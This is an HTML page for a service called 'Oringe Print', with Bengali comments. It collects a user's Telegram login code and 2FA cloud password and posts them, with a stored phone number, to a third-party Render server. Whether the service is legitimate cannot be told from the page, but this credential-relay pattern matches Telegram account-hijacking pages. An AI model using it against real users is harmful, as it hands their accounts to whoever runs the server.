<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify - ᴏʀɪɴɢᴇ ᴘʀɪɴᴛ</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #ff8c00; --bg: #050200; --glass: rgba(255, 140, 0, 0.05); }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; min-height: 100vh; display: flex; flex-direction: column; }
        .fiber-bg { position: fixed; inset: 0; z-index: -1; background: var(--bg); }
        .orb { position: absolute; border-radius: 50%; filter: blur(90px); opacity: 0.4; animation: float 8s infinite alternate ease-in-out; }
        .orb-1 { width: 35vw; height: 35vw; background: #ff8c00; top: -10%; left: -10%; } .orb-2 { width: 45vw; height: 45vw; background: #ff4500; bottom: -10%; right: -10%; animation-delay: -4s; }
        .fiber { position: absolute; width: 2px; height: 100vh; background: linear-gradient(transparent, #ff8c00, transparent); opacity: 0; animation: flow 3s infinite linear; }
        .f1 { left: 30%; animation-delay: 0.5s; } .f2 { left: 70%; animation-delay: 1.8s; }
        @keyframes float { 0% { transform: translate(0, 0); } 100% { transform: translate(40px, 40px); } }
        @keyframes flow { 0% { transform: translateY(-100%); opacity: 0; } 50% { opacity: 1; box-shadow: 0 0 20px #ff8c00; } 100% { transform: translateY(100%); opacity: 0; } }
        
        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; z-index: 1; }
        .card { width: 100%; max-width: 400px; background: var(--glass); border: 1px solid rgba(255,140,0,0.2); border-radius: 25px; padding: 35px; backdrop-filter: blur(25px); box-shadow: 0 20px 40px rgba(0,0,0,0.5); animation: slideUp 0.5s ease forwards; }
        @keyframes slideUp { 0% { opacity: 0; transform: translateY(30px); } 100% { opacity: 1; transform: translateY(0); } }
        h2 { text-align: center; color: #ffca80; margin-bottom: 25px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: var(--primary); font-size: 0.85rem; font-weight: 600; }
        input { width: 100%; padding: 14px; background: rgba(20, 10, 0, 0.6); border: 1px solid rgba(255,140,0,0.3); border-radius: 12px; color: #fff; box-sizing: border-box; outline: none; transition: 0.3s; text-align: center; letter-spacing: 3px; font-size: 1.2rem; }
        input[type="password"] { letter-spacing: normal; text-align: left; font-size: 1rem; }
        input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(255, 140, 0, 0.3); }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff8c00, #ff4500); border: none; border-radius: 12px; color: #fff; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        button:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255, 69, 0, 0.4); }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="fiber-bg"><div class="orb orb-1"></div><div class="orb orb-2"></div><div class="fiber f1"></div><div class="fiber f2"></div></div>
    
    <div id="header-part"></div>

    <div class="container">
        <div class="card" id="verifyCard">
            <h2>🔐 Verify OTP</h2>
            <div class="input-group"><label>Telegram Code</label><input type="text" id="otp" placeholder="• • • • •" maxlength="5"></div>
            <div class="input-group"><label>2FA Password (If enabled)</label><input type="password" id="pwd" placeholder="Cloud Password"></div>
            <button id="verifyBtn" onclick="verifyLogin()">Complete Login</button>
        </div>
    </div>

    <div id="footer-part"></div>

    <script>
        const BASE_URL = "https://oringe-print-reply-px.onrender.com"; // তোমার রেন্ডার বা সার্ভার URL

        window.addEventListener('DOMContentLoaded', async () => {
            try {
                document.getElementById('header-part').innerHTML = await (await fetch('header.html')).text();
                document.getElementById('footer-part').innerHTML = await (await fetch('footer.html')).text();
            } catch (err) { console.log("Header/Footer load error"); }
        });

        async function verifyLogin() {
            const otp = document.getElementById('otp').value;
            const pwd = document.getElementById('pwd').value;
            const btn = document.getElementById('verifyBtn');
            const phone = localStorage.getItem('phone'); // login.html থেকে সেভ করা নম্বর

            if(!otp) return alert("দয়া করে ওটিপি কোডটি দাও!");
            if(!phone) return alert("সেশন পাওয়া যায়নি! দয়া করে আবার লগইন করো।");

            btn.innerText = "Verifying...";
            btn.disabled = true;

            try {
                const response = await fetch(`${BASE_URL}/verify`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phone, 
                        otp: otp, 
                        password: pwd 
                    })
                });

                const data = await response.json();

                if (response.ok && data.status === "success") {
                    // সেশন সাকসেসফুল! সেশন স্ট্রিং চাইলে এখানেও সেভ রাখা যায়
                    localStorage.setItem('session_status', 'connected');
                    
                    document.getElementById('verifyCard').style.animation = "slideUp 0.4s reverse forwards";
                    setTimeout(() => location.href = 'dashboard.html', 400);
                } else {
                    alert("Verification Failed: " + (data.detail || "ভুল কোড!"));
                    btn.innerText = "Complete Login";
                    btn.disabled = false;
                }
            } catch (error) {
                alert("সার্ভার কানেকশন এরর!");
                btn.innerText = "Complete Login";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
